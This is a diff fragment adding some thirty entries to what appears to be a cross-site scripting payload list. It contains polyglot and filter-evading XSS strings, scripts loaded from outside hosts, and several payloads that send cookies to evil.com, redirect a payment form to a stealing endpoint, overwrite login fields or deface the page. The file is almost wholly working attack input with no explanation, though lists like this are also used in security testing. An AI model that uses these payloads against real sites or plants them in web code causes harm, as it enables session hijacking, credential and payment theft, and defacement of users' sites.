@@ -8,3 +8,36 @@
 "><iframe src="https://evil.com/injection.html"></iframe>
 "><form action="https://evil.com/injection" method="post"><input type="hidden" name="injection" value="true" /></form>
 "><style>body { background-image: url('https://evil.com/injection.jpg') }</style>
+<svg onload=location='javascript:alert(1)'>
+'"onclick=(co\u006efirm)?.`0`><sVg/i="${{7*7}}"oNload=" 0>(pro\u006dpt)`1`"></svG/</sTyle/</scripT/</textArea/</iFrame/</noScript/</seLect/--><h1><iMg/srC/onerror=alert`2`>%22%3E%3CSvg/onload=confirm`3`//<Script/src=//ChiragXSS.xSs.ht></scripT>
+<img src=totallyfake onerror=import(‘//domain.com/‘);//
+'-alert(1)-';"-alert(2)-"//"><svg/onload=alert(3)>
+"';alert(1);//
+";alert(1);//
+"></script><script>alert(1);</script>
+" onclick="alert(1);
+" style="display:none" onload="alert(1);
+"><img src=x onerror=alert(1);>
+"><svg onload=alert(1);>
+"><input type="text" autofocus onfocus=alert(1);>
+"><button onclick=alert(1);>Click me</button>
+"><a href="javascript:alert(1);">Click me</a>
+"><--<img+src= "><svg/onload+alert(document.domain)>> --!>
+'"><svg/onload=prompt(5);>{{7*7}}
+'"></title></textarea></script></style></noscript><script src=abc.xss.ht></script>
+"\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\>
+"><svg+svg+svg\/\/On+OnLoAd=confirm(1)>
+<img src="x">'">${{7*7}}
+<script>alert('JS injection')</script>
+<script src="http://evil.com/malicious.js"></script>
+<script>document.location='http://evil.com/steal-data.php?cookie='+document.cookie</script>
+<script>document.forms[0].submit()</script>
+<script>document.getElementById('username').value='hacker';document.getElementById('password').value='123456';</script>
+<script>document.getElementById('payment-form').action='http://evil.com/steal-data.php';document.getElementById('payment-form').submit();</script>
+<script>document.write('<img src="http://evil.com/steal-data.php?cookie='+document.cookie+'" />')</script>
+<script>history.replaceState({}, '', 'http://evil.com/steal-data.php?cookie='+document.cookie)</script>
+<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 74, 83, 32, 105, 110, 106, 101, 99, 116, 105, 111, 110, 39, 41))</script>
+<script>document.body.innerHTML="<h1>This site has been hacked by JS injection!</h1>";</script>
+
+
+
